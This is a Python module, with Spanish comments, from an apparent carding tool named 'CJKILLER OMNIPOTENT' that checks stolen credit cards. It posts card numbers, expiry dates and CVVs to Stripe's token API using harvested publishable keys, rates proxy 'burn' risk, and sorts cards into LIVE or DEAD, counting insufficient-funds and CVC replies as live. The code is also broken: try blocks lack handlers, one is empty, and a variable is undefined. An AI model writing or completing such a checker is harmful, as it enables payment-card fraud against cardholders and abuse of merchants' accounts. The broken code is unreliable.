# =================================================================
# PROJECT: CJKILLER OMNIPOTENT
# MODULE: checker_engine.py (DUAL GATEWAY SYSTEM)
# =================================================================

import requests
from pk_hunter import PKHunter

class RiskAnalyzer:
    @staticmethod
    def get_risk_report(response_json):
        """Analiza la salud de la conexión sin alterar el gate."""
        risk_level = response_json.get('outcome', {}).get('risk_level', 'unknown')
        if risk_level == 'highest': return "🔴 RIESGO ALTO (Proxy Quemado)"
        if risk_level == 'elevated': return "🟡 RIESGO MEDIO (IP Sospechosa)"
        return "🟢 RIESGO BAJO (Conexión Limpia)"

class CCChecker:
    current_pk = None

    @staticmethod
    def check_gate_real(cc, mm, yy, cvv):
        """ESTE ES TU GATE DE STRIPE ACTUAL (NO SE TOCA LA LÓGICA)"""
        if not CCChecker.current_pk: CCChecker.current_pk = PKHunter.get_fresh_pk()
        
        payload = {
            'card[number]': cc, 'card[cvc]': cvv,
            'card[exp_month]': mm, 'card[exp_year]': yy,
            'key': CCChecker.current_pk
        }
        
        try:
            r = requests.post('https://api.stripe.com/v1/tokens', data=payload, timeout=15)
            res = r.json()
            # SUSTITUYE DESDE LA LÍNEA 37 HASTA LA 39 CON ESTO:
        if "id" in res:
            # Filtro Real: Solo si pasó el CVC o se creó el token correctamente
            return {"status": "LIVE ✅", "msg": "Token Created", "raw": res}
        
        err_msg = res.get('error', {}).get('message', 'Declined')
        # Si el banco dice que no tiene fondos, ¡Sigue siendo LIVE!
        if "insufficient_funds" in err_msg.lower():
            return {"status": "LIVE 🟢 (Low Funds)", "msg": "Insufficient Funds", "raw": res}
            
        return {"status": "DEAD ❌", "msg": err_msg, "raw": res}

class ChaosGate:
    @staticmethod
    def check_chaos(cc, mm, yy, cvv):
        """NUEVO MOTOR CHAOS AUTH (PARA EL COMANDO /CHAOS)"""
        pk = PKHunter.get_fresh_pk()
        headers = {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)'}
        payload = {
            'type': 'card', 'card[number]': cc, 'card[cvc]': cvv,
            'card[exp_month]': mm, 'card[exp_year]': yy, 'key': pk
        }
        
        try:
            
        # Analizamos la respuesta profunda de Chaos Auth V2
        res_text = str(res).lower()
        
        if '"status": "succeeded"' in res_text or 'cvc_check": "pass"' in res_text:
            return {"status": "LIVE ✅", "msg": "Chaos Success", "raw": res}
            
        elif "insufficient_funds" in res_text:
            return {"status": "LIVE 🟢 (Low Funds)", "msg": "Insufficient Funds", "raw": res}
            
        elif any(x in res_text for x in ["funds", "cvc", "authentication_required"]):
            # Estos casos son tarjetas reales que el banco reconoce
            return {"status": "LIVE ✅", "msg": "Approved (Squeezer)", "raw": res}
            
        else:
            # Todo lo demás es DEAD real
            err_raw = res.get('error', {}).get('message', 'Declined')
            return {"status": "DEAD ❌", "msg": err_raw, "raw": res}
